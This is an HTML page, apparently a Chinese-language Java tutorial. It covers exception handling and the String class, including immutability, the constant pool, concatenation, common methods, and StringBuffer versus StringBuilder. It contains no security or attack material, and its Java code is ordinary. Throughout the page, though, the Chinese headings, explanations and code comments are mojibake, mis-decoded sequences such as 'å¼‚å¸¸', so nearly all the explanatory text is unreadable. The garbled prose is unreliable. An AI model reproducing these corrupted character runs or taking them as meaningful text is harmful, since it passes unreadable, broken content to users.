<h3 id="3ã€Javaå¼‚å¸¸å¤„ç†æœºåˆ¶ä¸å¤„ç†å¼‚å¸¸"><a href="#3ã€Javaå¼‚å¸¸å¤„ç†æœºåˆ¶ä¸å¤„ç†å¼‚å¸¸" class="headerlink" title="3ã€Javaå¼‚å¸¸å¤„ç†æœºåˆ¶ä¸å¤„ç†å¼‚å¸¸"></a>3ã€Javaå¼‚å¸¸å¤„ç†æœºåˆ¶ä¸å¤„ç†å¼‚å¸¸</h3><ul>
<li>æŠ›å‡ºå¼‚å¸¸</li>
<li>æ•è·å¼‚å¸¸</li>
<li>å¼‚å¸¸å¤„ç†äº”ä¸ªå…³é”®å­—ï¼š<ul>
<li>tryã€catchã€ finallyã€throwã€throws</li>
</ul>
</li>
</ul>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-17/0a394f1331265ead6eba52441a0770fa--928b--image-20240917095443916.png" alt="image-20240917095443916"></p>
<h3 id="4ã€è‡ªå®šä¹‰å¼‚å¸¸"><a href="#4ã€è‡ªå®šä¹‰å¼‚å¸¸" class="headerlink" title="4ã€è‡ªå®šä¹‰å¼‚å¸¸"></a>4ã€è‡ªå®šä¹‰å¼‚å¸¸</h3><ul>
<li>ä½¿ç”¨Javaå†…ç½®çš„å¼‚å¸¸ç±»å¯ä»¥æè¿°åœ¨ç¼–ç¨‹æ—¶å²€ç°çš„å¤§éƒ¨åˆ†å¼‚å¸¸æƒ…å†µã€‚é™¤æ­¤ä¹‹å¤–ï¼Œç”¨æˆ·è¿˜å¯ä»¥è‡ªå®šä¹‰å¼‚å¸¸ã€‚ç”¨æˆ·è‡ªå®šä¹‰å¼‚å¸¸ç±»ï¼Œåªéœ€ç»§æ‰¿ Exceptionç±»å³å¯ã€‚</li>
<li>åœ¨ç¨‹åºä¸­ä½¿ç”¨è‡ªå®šä¹‰å¼‚å¸¸ç±»ï¼Œå¤§ä½“å¯åˆ†ä¸ºä»¥ä¸‹å‡ ä¸ªæ­¥éª¤ï¼š<ol>
<li>åˆ›å»ºè‡ªå®šä¹‰å¼‚å¸¸ç±»ã€‚</li>
<li>åœ¨æ–¹æ³•ä¸­é€šè¿‡ throwå…³é”®å­—æŠ›å‡ºå¼‚å¸¸å¯¹è±¡ã€‚</li>
<li>å¦‚æœåœ¨å½“å‰æŠ›å‡ºå¼‚å¸¸çš„æ–¹æ³•ä¸­å¤„ç†å¼‚å¸¸ï¼Œå¯ä»¥ä½¿ç”¨try- catchè¯­å¥æ•è·å¹¶å¤„ç†ï¼›å¦åˆ™åœ¨æ–¹æ³•çš„å£°æ˜å¤„é€šè¿‡ throwså…³é”®å­—æŒ‡æ˜è¦æŠ›å²€ç»™æ–¹æ³•è°ƒç”¨è€…çš„å¼‚å¸¸ï¼Œç»§ç»­è¿›è¡Œä¸‹ä¸€æ­¥æ“ä½œã€‚</li>
<li>åœ¨å‡ºç°å¼‚å¸¸æ–¹æ³•çš„è°ƒç”¨è€…ä¸­æ•è·å¹¶å¤„ç†å¼‚å¸¸ã€‚</li>
</ol>
</li>
</ul>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-17/77ec534b38864564efad53e68734991d--162a--image-20240917100058991.png" alt="image-20240917100058991"></p>
<h3 id="5ã€æ€»ç»“"><a href="#5ã€æ€»ç»“" class="headerlink" title="5ã€æ€»ç»“"></a>5ã€æ€»ç»“</h3><ul>
<li>å¤„ç†è¿è¡Œæ—¶å¼‚å¸¸æ—¶ï¼Œé‡‡ç”¨é€»è¾‘å»åˆç†è§„é¿åŒæ—¶è¾…åŠ© try-catch ï¼›</li>
<li>å¤„ç†åœ¨å¤šé‡ catchå—åé¢ï¼Œå¯ä»¥åŠ ä¸€ä¸ª catchï¼ˆ Exceptionï¼‰æ¥å¤„ç†å¯èƒ½ä¼šè¢«é—æ¼çš„å¼‚å¸¸ï¼›</li>
<li>å¯¹äºä¸ç¡®å®šçš„ä»£ç ï¼Œä¹Ÿå¯ä»¥åŠ ä¸Štry- catchï¼Œå¤„ç†æ½œåœ¨çš„å¼‚å¸¸ï¼›</li>
<li>å°½é‡å»å¤„ç†å¼‚å¸¸ï¼Œåˆ‡å¿Œåªæ˜¯ç®€å•åœ°è°ƒç”¨ printStackTrace0å»æ‰“å°è¾“å‡ºï¼›</li>
<li>å…·ä½“å¦‚ä½•å¤„ç†å¼‚å¸¸ï¼Œè¦æ ¹æ®ä¸åŒçš„ä¸šåŠ¡éœ€æ±‚å’Œå¼‚å¸¸ç±»å‹å»å†³å®šï¼›</li>
<li>å°½é‡æ·»åŠ  finallyï¼è¯­å¥å—å»é‡Šæ”¾å ç”¨çš„èµ„æºã€‚</li>
</ul>
<h2 id="å¸¸ç”¨ç±»"><a href="#å¸¸ç”¨ç±»" class="headerlink" title="å¸¸ç”¨ç±»"></a>å¸¸ç”¨ç±»</h2><h3 id="1ã€å­—ç¬¦ä¸²ç›¸å…³çš„ç±»"><a href="#1ã€å­—ç¬¦ä¸²ç›¸å…³çš„ç±»" class="headerlink" title="1ã€å­—ç¬¦ä¸²ç›¸å…³çš„ç±»"></a>1ã€å­—ç¬¦ä¸²ç›¸å…³çš„ç±»</h3><h4 id="1ã€Stringç±»çš„æ¦‚è¿°"><a href="#1ã€Stringç±»çš„æ¦‚è¿°" class="headerlink" title="1ã€Stringç±»çš„æ¦‚è¿°"></a>1ã€Stringç±»çš„æ¦‚è¿°</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * String:å­—ç¬¦ä¸²ï¼Œä½¿ç”¨ä¸€å¯¹â€œâ€å¼•èµ·æ¥è¡¨ç¤ºã€‚</span></span><br><span class="line"><span class="comment">     * 1.Stringå£°æ˜ä¸ºfinalçš„ï¼Œä¸å¯è¢«ç»§æ‰¿</span></span><br><span class="line"><span class="comment">     * 2.Stringå®ç°äº†Serializableæ¥å£ï¼šè¡¨ç¤ºå­—ç¬¦ä¸²æ˜¯æ”¯æŒåºåˆ—åŒ–çš„ã€‚</span></span><br><span class="line"><span class="comment">     *         å®ç°äº†Comparableæ¥å£ï¼šè¡¨ç¤ºStringå¯ä»¥æ¯”è¾ƒå¤§å°</span></span><br><span class="line"><span class="comment">     * 3.Stringå†…éƒ¨å®šä¹‰äº†final char[] valueç”¨äºå­˜å‚¨å­—ç¬¦ä¸²æ•°æ®</span></span><br><span class="line"><span class="comment">     * 4.String:ä»£è¡¨ä¸å¯å˜çš„å­—ç¬¦åºåˆ—ã€‚ç®€ç§°ï¼šä¸å¯å˜æ€§ã€‚</span></span><br><span class="line"><span class="comment">     *      ä½“ç°ï¼š1.å½“å¯¹å­—ç¬¦ä¸²é‡æ–°èµ‹å€¼æ—¶ï¼Œéœ€è¦é‡å†™æŒ‡å®šå†…å­˜åŒºåŸŸèµ‹å€¼ï¼Œä¸èƒ½ä½¿ç”¨åŸæœ‰çš„valueè¿›è¡Œèµ‹å€¼ã€‚</span></span><br><span class="line"><span class="comment">     *           2.å½“å¯¹ç°æœ‰çš„å­—ç¬¦ä¸²è¿›è¡Œè¿æ¥æ“ä½œæ—¶ï¼Œä¹Ÿéœ€è¦é‡æ–°æŒ‡å®šå†…å­˜åŒºåŸŸèµ‹å€¼ï¼Œä¸èƒ½ä½¿ç”¨åŸæœ‰çš„valueè¿›è¡Œèµ‹å€¼ã€‚</span></span><br><span class="line"><span class="comment">     *           3.å½“è°ƒç”¨Stringçš„replace()æ–¹æ³•ä¿®æ”¹æŒ‡å®šå­—ç¬¦æˆ–å­—ç¬¦ä¸²æ—¶ï¼Œä¹Ÿéœ€è¦é‡æ–°æŒ‡å®šå†…å­˜åŒºåŸŸèµ‹å€¼ï¼Œä¸èƒ½ä½¿ç”¨åŸæœ‰çš„valueè¿›è¡Œèµ‹å€¼ã€‚</span></span><br><span class="line"><span class="comment">     * 5.é€šè¿‡å­—é¢é‡çš„æ–¹å¼ï¼ˆåŒºåˆ«äºnewï¼‰ç»™ä¸€ä¸ªå­—ç¬¦ä¸²èµ‹å€¼ï¼Œæ­¤æ—¶çš„å­—ç¬¦ä¸²å€¼å£°æ˜åœ¨å­—ç¬¦ä¸²å¸¸é‡æ± ä¸­ã€‚</span></span><br><span class="line"><span class="comment">     * 6.å­—ç¬¦ä¸²å¸¸é‡æ± ä¸­æ˜¯ä¸ä¼šå­˜å‚¨ç›¸åŒå†…å®¹çš„å­—ç¬¦ä¸²çš„ã€‚</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     */</span></span><br></pre></td></tr></table></figure>

<h4 id="2ã€ç†è§£Stringç±»çš„ä¸å¯è§æ€§"><a href="#2ã€ç†è§£Stringç±»çš„ä¸å¯è§æ€§" class="headerlink" title="2ã€ç†è§£Stringç±»çš„ä¸å¯è§æ€§"></a>2ã€ç†è§£Stringç±»çš„ä¸å¯è§æ€§</h4><p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-17/d405c3f637ebd987f0af0044618984ed--8070--image-20240917103243395.png" alt="image-20240917103243395"></p>
<h4 id="3ã€Stringä¸åŒå®ä¾‹åŒ–æ–¹æ³•çš„å¯¹æ¯”"><a href="#3ã€Stringä¸åŒå®ä¾‹åŒ–æ–¹æ³•çš„å¯¹æ¯”" class="headerlink" title="3ã€Stringä¸åŒå®ä¾‹åŒ–æ–¹æ³•çš„å¯¹æ¯”"></a>3ã€Stringä¸åŒå®ä¾‹åŒ–æ–¹æ³•çš„å¯¹æ¯”</h4><ul>
<li>Stringå¯¹è±¡çš„åˆ›å»º</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> <span class="string">&quot;hello&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//æœ¬è´¨ä¸Šthis.value = new char[0];</span></span><br><span class="line"><span class="type">String</span>  <span class="variable">s1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(); </span><br><span class="line"></span><br><span class="line"><span class="comment">//this.value = original.value;</span></span><br><span class="line"><span class="type">String</span>  <span class="variable">s2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(String original); </span><br><span class="line"></span><br><span class="line"><span class="comment">//this.value = Arrays.copyOf(value, value.length);</span></span><br><span class="line"><span class="type">String</span>  <span class="variable">s3</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(<span class="type">char</span>[] a);</span><br><span class="line"></span><br><span class="line"><span class="type">String</span>  <span class="variable">s4</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(<span class="type">char</span>[] a,<span class="type">int</span> startIndex,<span class="type">int</span> count);</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-17/f88f172d93e3c916b346a9b232fdd7e4--c081--f-011.png" alt="f-011"></p>
<p>String str1  &#x3D; â€œabcâ€;ä¸String str2 &#x3D; new String(â€œabcâ€);çš„åŒºåˆ«ï¼Ÿ</p>
<ul>
<li>å­—ç¬¦ä¸²å¸¸é‡å­˜å‚¨åœ¨å­—ç¬¦ä¸²å¸¸é‡æ± ï¼Œç›®çš„æ˜¯å…±äº«</li>
<li>å­—ç¬¦ä¸²éå¸¸é‡å¯¹è±¡å­˜å‚¨åœ¨å †ä¸­ã€‚</li>
</ul>
<h4 id="4ã€Stringä¸åŒæ‹¼æ¥æ“ä½œçš„å¯¹æ¯”"><a href="#4ã€Stringä¸åŒæ‹¼æ¥æ“ä½œçš„å¯¹æ¯”" class="headerlink" title="4ã€Stringä¸åŒæ‹¼æ¥æ“ä½œçš„å¯¹æ¯”"></a>4ã€Stringä¸åŒæ‹¼æ¥æ“ä½œçš„å¯¹æ¯”</h4><h5 id="Stringä½¿ç”¨é™·é˜±"><a href="#Stringä½¿ç”¨é™·é˜±" class="headerlink" title="Stringä½¿ç”¨é™·é˜±"></a>Stringä½¿ç”¨é™·é˜±</h5><ul>
<li><p>String s1 &#x3D; â€œaâ€; </p>
<blockquote>
<p>è¯´æ˜ï¼šåœ¨å­—ç¬¦ä¸²å¸¸é‡æ± ä¸­åˆ›å»ºäº†ä¸€ä¸ªå­—é¢é‡ä¸ºâ€aâ€çš„å­—ç¬¦ä¸²ã€‚</p>
</blockquote>
</li>
<li><p>s1 &#x3D; s1 + â€œbâ€; </p>
<blockquote>
<p>è¯´æ˜ï¼šå®é™…ä¸ŠåŸæ¥çš„â€œaâ€å­—ç¬¦ä¸²å¯¹è±¡å·²ç»ä¸¢å¼ƒäº†ï¼Œç°åœ¨åœ¨å †ç©ºé—´ä¸­äº§ç”Ÿäº†ä¸€ä¸ªå­—ç¬¦ä¸²s1+â€bâ€ï¼ˆä¹Ÿå°±æ˜¯â€abâ€)ã€‚å¦‚æœå¤šæ¬¡æ‰§è¡Œè¿™äº›æ”¹å˜ä¸²å†…å®¹çš„æ“ä½œï¼Œä¼šå¯¼è‡´å¤§é‡å‰¯æœ¬å­—ç¬¦ä¸²å¯¹è±¡å­˜ç•™åœ¨å†…å­˜ä¸­ï¼Œé™ä½æ•ˆç‡ã€‚å¦‚æœè¿™æ ·çš„æ“ä½œæ”¾åˆ°å¾ªç¯ä¸­ï¼Œä¼šæå¤§å½±å“ç¨‹åºçš„æ€§èƒ½ã€‚</p>
</blockquote>
</li>
<li><p>String s2 &#x3D; â€œabâ€;</p>
<blockquote>
<p>è¯´æ˜ï¼šç›´æ¥åœ¨å­—ç¬¦ä¸²å¸¸é‡æ± ä¸­åˆ›å»ºä¸€ä¸ªå­—é¢é‡ä¸ºâ€abâ€çš„å­—ç¬¦ä¸²ã€‚</p>
</blockquote>
</li>
<li><p>String s3 &#x3D; â€œaâ€ + â€œbâ€;</p>
<blockquote>
<p>è¯´æ˜ï¼šs3æŒ‡å‘å­—ç¬¦ä¸²å¸¸é‡æ± ä¸­å·²ç»åˆ›å»ºçš„â€abâ€çš„å­—ç¬¦ä¸²ã€‚</p>
</blockquote>
</li>
<li><p>String s4 &#x3D; s1.intern();</p>
<blockquote>
<p>è¯´æ˜ï¼šå †ç©ºé—´çš„s1å¯¹è±¡åœ¨è°ƒç”¨intern()ä¹‹åï¼Œä¼šå°†å¸¸é‡æ± ä¸­å·²ç»å­˜åœ¨çš„â€abâ€å­—ç¬¦ä¸²èµ‹å€¼ç»™s4ã€‚</p>
</blockquote>
</li>
</ul>
<h4 id="5ã€ä¸€é“é¢è¯•é¢˜"><a href="#5ã€ä¸€é“é¢è¯•é¢˜" class="headerlink" title="5ã€ä¸€é“é¢è¯•é¢˜"></a>5ã€ä¸€é“é¢è¯•é¢˜</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">StringTest</span> &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(<span class="string">&quot;good&quot;</span>);</span><br><span class="line">    <span class="type">char</span>[] ch = &#123; <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;s&#x27;</span>, <span class="string">&#x27;t&#x27;</span> &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">change</span><span class="params">(String str, <span class="type">char</span> ch[])</span> &#123;</span><br><span class="line">        str = <span class="string">&quot;test ok&quot;</span>;</span><br><span class="line">        ch[<span class="number">0</span>] = <span class="string">&#x27;b&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">StringTest</span> <span class="variable">ex</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringTest</span>();</span><br><span class="line">        ex.change(ex.str, ex.ch);</span><br><span class="line">        System.out.println(ex.str);<span class="comment">//good</span></span><br><span class="line">        System.out.println(ex.ch);<span class="comment">//best</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="6ã€JVMä¸­æ¶‰åŠå­—ç¬¦ä¸²çš„å†…å­˜ç»“æ„"><a href="#6ã€JVMä¸­æ¶‰åŠå­—ç¬¦ä¸²çš„å†…å­˜ç»“æ„" class="headerlink" title="6ã€JVMä¸­æ¶‰åŠå­—ç¬¦ä¸²çš„å†…å­˜ç»“æ„"></a>6ã€JVMä¸­æ¶‰åŠå­—ç¬¦ä¸²çš„å†…å­˜ç»“æ„</h4><p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-17/5f40e28ca82ae81c89448191221f92f0--83c8--f-06.png" alt="f-06"></p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-17/b49ce55a60f475317da97e9ee4b24e12--7a09--f-07.png" alt="f-07"></p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-17/8435cd3f8e1c81d70aea2e42ef381fbe--922d--f-08.png" alt="f-08"></p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-17/659ed8f50e7ce55076c5c296c3d69baf--6882--f-09.png" alt="f-09"></p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-17/4244078ff7a3b6a04d0d154bf6acc9f9--06e2--f-10.png" alt="f-10"></p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-17/40b729502feb4a579d2b142d353e93e8--4004--f-11.png" alt="f-11"></p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-17/a204f787a807f87378f7985085222d20--1859--f-12.png" alt="f-12"></p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-17/1b6c0ffa297bcdaceb4608573e08b701--5284--f-13.png" alt="f-13"></p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-17/23223b4d4c88ab5e9b5dff87bd1ea81d--4171--f-15.png" alt="f-15"></p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-17/bec0d1357c803bbce86c88c385b006c1--9cc2--f-16.png" alt="f-16"></p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-17/d8b42e2a9e4c2fab065e9a7160656ca5--acd9--f-17.png" alt="f-17"></p>
<h4 id="7ã€Stringå¸¸ç”¨çš„æ–¹æ³•"><a href="#7ã€Stringå¸¸ç”¨çš„æ–¹æ³•" class="headerlink" title="7ã€Stringå¸¸ç”¨çš„æ–¹æ³•"></a>7ã€Stringå¸¸ç”¨çš„æ–¹æ³•</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * int length()ï¼šè¿”å›å­—ç¬¦ä¸²çš„é•¿åº¦ï¼šreturn value.length</span></span><br><span class="line"><span class="comment"> * char charAt(int index)ï¼šè¿”å›æŸç´¢å¼•å¤„çš„å­—ç¬¦return value[index]</span></span><br><span class="line"><span class="comment"> * boolean isEmpty()ï¼šåˆ¤æ–­æ˜¯å¦æ˜¯ç©ºå­—ç¬¦ä¸²ï¼šreturn value.length==0</span></span><br><span class="line"><span class="comment"> * String toLowerCase()ï¼šä½¿ç”¨é»˜è®¤è¯­è¨€ç¯å¢ƒï¼Œå°†Stringä¸­çš„æ‰€æœ‰å­—ç¬¦è½¬æ¢ä¸ºå°å†™</span></span><br><span class="line"><span class="comment"> * String toUpperCase()ï¼šä½¿ç”¨é»˜è®¤è¯­è¨€ç¯å¢ƒï¼Œå°†Stringä¸­çš„æ‰€æœ‰å­—ç¬¦è½¬æ¢ä¸ºå¤§å†™</span></span><br><span class="line"><span class="comment"> * String trim()ï¼šè¿”å›å­—ç¬¦ä¸²çš„å‰¯æœ¬ï¼Œå¿½ç•¥å‰å¯¼ç©ºç™½å’Œå°¾éƒ¨ç©ºç™½</span></span><br><span class="line"><span class="comment"> * boolean equals(Object obj)ï¼šæ¯”è¾ƒå­—ç¬¦ä¸²çš„å†…å®¹æ˜¯å¦ç›¸åŒ</span></span><br><span class="line"><span class="comment"> * boolean equals IgnoreCase(String anotherString)ï¼šä¸equalsæ–¹æ³•ç±»ä¼¼ï¼Œå¿½ç•¥å¤§å°å†™</span></span><br><span class="line"><span class="comment"> * String concat(String str)ï¼šå°†æŒ‡å®šå­—ç¬¦ä¸²è¿æ¥åˆ°æ­¤å­—ç¬¦ä¸²çš„ç»“å°¾ã€‚ç­‰ä»·äºç”¨â€œ+â€</span></span><br><span class="line"><span class="comment"> * int compareTo(String anotherString)ï¼šæ¯”è¾ƒä¸¤ä¸ªå­—ç¬¦ä¸²çš„å¤§å°</span></span><br><span class="line"><span class="comment"> * String substring(int beginIndex)ï¼šè¿”å›ä¸€ä¸ªæ–°çš„å­—ç¬¦ä¸²ï¼Œå®ƒæ˜¯æ­¤å­—ç¬¦ä¸²çš„ä»beginIndexå¼€å§‹æˆªå–åˆ°æœ€åçš„ä¸€ä¸ªå­å­—ç¬¦ä¸²ã€‚</span></span><br><span class="line"><span class="comment"> * String substring(int beginIndex,int endIndex)ï¼šè¿”å›ä¸€ä¸ªæ–°å­—ç¬¦ä¸²ï¼Œå®ƒæ˜¯æ­¤å­—ç¬¦ä¸²ä»beginIndexå¼€å§‹æˆªå–åˆ°endIndex(ä¸åŒ…å«)çš„ä¸€ä¸ªå­å­—ç¬¦ä¸²ã€‚</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * boolean endsWith(String suffix)ï¼šæµ‹è¯•æ­¤å­—ç¬¦ä¸²æ˜¯å¦ä»¥æŒ‡å®šçš„åç¼€ç»“æŸ</span></span><br><span class="line"><span class="comment"> * boolean startsWith(String prefix)ï¼šæµ‹è¯•æ­¤å­—ç¬¦ä¸²æ˜¯å¦ä»¥æŒ‡å®šçš„å‰ç¼€å¼€å§‹</span></span><br><span class="line"><span class="comment"> * boolean startsWith(String prefix, int toffset)ï¼šæµ‹è¯•æ­¤å­—ç¬¦ä¸²ä»æŒ‡å®šç´¢å¼•å¼€å§‹çš„å­å­—ç¬¦ä¸²æ˜¯å¦ä»¥æŒ‡å®šå‰ç¼€å¼€å§‹</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * boolean contains(CharSequence s)ï¼šå½“ä¸”ä»…å½“æ­¤å­—ç¬¦ä¸²åŒ…å«æŒ‡å®šçš„ char å€¼åºåˆ—æ—¶ï¼Œè¿”å› true</span></span><br><span class="line"><span class="comment"> * int indexOf(String str)ï¼šè¿”å›æŒ‡å®šå­å­—ç¬¦ä¸²åœ¨æ­¤å­—ç¬¦ä¸²ä¸­ç¬¬ä¸€æ¬¡å‡ºç°å¤„çš„ç´¢å¼•</span></span><br><span class="line"><span class="comment"> * int indexOf(String str, int fromIndex)ï¼šè¿”å›æŒ‡å®šå­å­—ç¬¦ä¸²åœ¨æ­¤å­—ç¬¦ä¸²ä¸­ç¬¬ä¸€æ¬¡å‡ºç°å¤„çš„ç´¢å¼•ï¼Œä»æŒ‡å®šçš„ç´¢å¼•å¼€å§‹</span></span><br><span class="line"><span class="comment"> * int lastIndexOf(String str)ï¼šè¿”å›æŒ‡å®šå­å­—ç¬¦ä¸²åœ¨æ­¤å­—ç¬¦ä¸²ä¸­æœ€å³è¾¹å‡ºç°å¤„çš„ç´¢å¼•</span></span><br><span class="line"><span class="comment"> * int lastIndexOf(String str, int fromIndex)ï¼šè¿”å›æŒ‡å®šå­å­—ç¬¦ä¸²åœ¨æ­¤å­—ç¬¦ä¸²ä¸­æœ€åä¸€æ¬¡å‡ºç°å¤„çš„ç´¢å¼•ï¼Œä»æŒ‡å®šçš„ç´¢å¼•å¼€å§‹åå‘æœç´¢</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * æ³¨ï¼šindexOfå’ŒlastIndexOfæ–¹æ³•å¦‚æœæœªæ‰¾åˆ°éƒ½æ˜¯è¿”å›-1</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">    * æ›¿æ¢ï¼š</span></span><br><span class="line"><span class="comment">    * String replace(char oldChar, char newChar)ï¼šè¿”å›ä¸€ä¸ªæ–°çš„å­—ç¬¦ä¸²ï¼Œå®ƒæ˜¯é€šè¿‡ç”¨ newChar æ›¿æ¢æ­¤å­—ç¬¦ä¸²ä¸­å‡ºç°çš„æ‰€æœ‰ oldChar å¾—åˆ°çš„ã€‚</span></span><br><span class="line"><span class="comment">    * String replace(CharSequence target, CharSequence replacement)ï¼šä½¿ç”¨æŒ‡å®šçš„å­—é¢å€¼æ›¿æ¢åºåˆ—æ›¿æ¢æ­¤å­—ç¬¦ä¸²æ‰€æœ‰åŒ¹é…å­—é¢å€¼ç›®æ ‡åºåˆ—çš„å­å­—ç¬¦ä¸²ã€‚</span></span><br><span class="line"><span class="comment">    * String replaceAll(String regex, String replacement)ï¼šä½¿ç”¨ç»™å®šçš„ replacement æ›¿æ¢æ­¤å­—ç¬¦ä¸²æ‰€æœ‰åŒ¹é…ç»™å®šçš„æ­£åˆ™è¡¨è¾¾å¼çš„å­å­—ç¬¦ä¸²ã€‚</span></span><br><span class="line"><span class="comment">    * String replaceFirst(String regex, String replacement)ï¼šä½¿ç”¨ç»™å®šçš„ replacement æ›¿æ¢æ­¤å­—ç¬¦ä¸²åŒ¹é…ç»™å®šçš„æ­£åˆ™è¡¨è¾¾å¼çš„ç¬¬ä¸€ä¸ªå­å­—ç¬¦ä¸²ã€‚</span></span><br><span class="line"><span class="comment">    *</span></span><br><span class="line"><span class="comment">    * åŒ¹é…:</span></span><br><span class="line"><span class="comment">    * boolean matches(String regex)ï¼šå‘ŠçŸ¥æ­¤å­—ç¬¦ä¸²æ˜¯å¦åŒ¹é…ç»™å®šçš„æ­£åˆ™è¡¨è¾¾å¼ã€‚</span></span><br><span class="line"><span class="comment">    *</span></span><br><span class="line"><span class="comment">    * åˆ‡ç‰‡ï¼š</span></span><br><span class="line"><span class="comment">    * String[] split(String regex)ï¼šæ ¹æ®ç»™å®šæ­£åˆ™è¡¨è¾¾å¼çš„åŒ¹é…æ‹†åˆ†æ­¤å­—ç¬¦ä¸²ã€‚</span></span><br><span class="line"><span class="comment">    * String[] split(String regex, int limit)ï¼šæ ¹æ®åŒ¹é…ç»™å®šçš„æ­£åˆ™è¡¨è¾¾å¼æ¥æ‹†åˆ†æ­¤å­—ç¬¦ä¸²ï¼Œæœ€å¤šä¸è¶…è¿‡limitä¸ªï¼Œå¦‚æœè¶…è¿‡äº†ï¼Œå‰©ä¸‹çš„å…¨éƒ¨éƒ½æ”¾åˆ°æœ€åä¸€ä¸ªå…ƒç´ ä¸­ã€‚</span></span><br><span class="line"><span class="comment">    *</span></span><br><span class="line"><span class="comment">    */</span></span><br></pre></td></tr></table></figure>

<h4 id="8-Stringä¸å…¶ä»–æ•°æ®ç±»å‹ä¹‹é—´çš„è½¬æ¢"><a href="#8-Stringä¸å…¶ä»–æ•°æ®ç±»å‹ä¹‹é—´çš„è½¬æ¢" class="headerlink" title="8.Stringä¸å…¶ä»–æ•°æ®ç±»å‹ä¹‹é—´çš„è½¬æ¢"></a>8.Stringä¸å…¶ä»–æ•°æ®ç±»å‹ä¹‹é—´çš„è½¬æ¢</h4><ul>
<li><p>Stringâ€“&gt; int  ä½¿ç”¨ Integer.parseInt(str1);å°†å­—ç¬¦ä¸²è½¬æ¢ä¸ºæ•°å­—</p>
</li>
<li><p>String â€“&gt; char[]:è°ƒç”¨Stringçš„toCharArray()</p>
</li>
<li><p>char[] â€“&gt; String:è°ƒç”¨Stringçš„æ„é€ å™¨</p>
</li>
<li><p>String &lt;â€”&gt;  byte   </p>
<ul>
<li>ç¼–ç ï¼šString â€“&gt; byte[]:è°ƒç”¨Stringçš„getBytes()</li>
<li>è§£ç ï¼šbyte[] â€“&gt; String:è°ƒç”¨Stringçš„æ„é€ å™¨</li>
</ul>
</li>
</ul>
<h4 id="9ã€StringBufferå’ŒStringBuilderçš„ä»‹ç»"><a href="#9ã€StringBufferå’ŒStringBuilderçš„ä»‹ç»" class="headerlink" title="9ã€StringBufferå’ŒStringBuilderçš„ä»‹ç»"></a>9ã€StringBufferå’ŒStringBuilderçš„ä»‹ç»</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Stringã€StringBufferã€StringBuilderä¸‰è€…çš„å¼‚åŒï¼Ÿ</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * String:ä¸å¯å˜çš„å­—ç¬¦åºåˆ—ï¼›åº•å±‚ä½¿ç”¨char[]å­˜å‚¨</span></span><br><span class="line"><span class="comment"> * StringBuffer:å¯å˜çš„å­—ç¬¦åºåˆ—ï¼›çº¿ç¨‹å®‰å…¨çš„ï¼Œæ•ˆç‡ä½ï¼›åº•å±‚ä½¿ç”¨char[]å­˜å‚¨</span></span><br><span class="line"><span class="comment"> * StringBuilder:å¯å˜çš„å­—ç¬¦åºåˆ—ï¼›jdk5.0æ–°å¢çš„ï¼Œçº¿ç¨‹ä¸å®‰å…¨çš„ï¼Œæ•ˆç‡é«˜ï¼›åº•å±‚ä½¿ç”¨char[]å­˜å‚¨</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure>

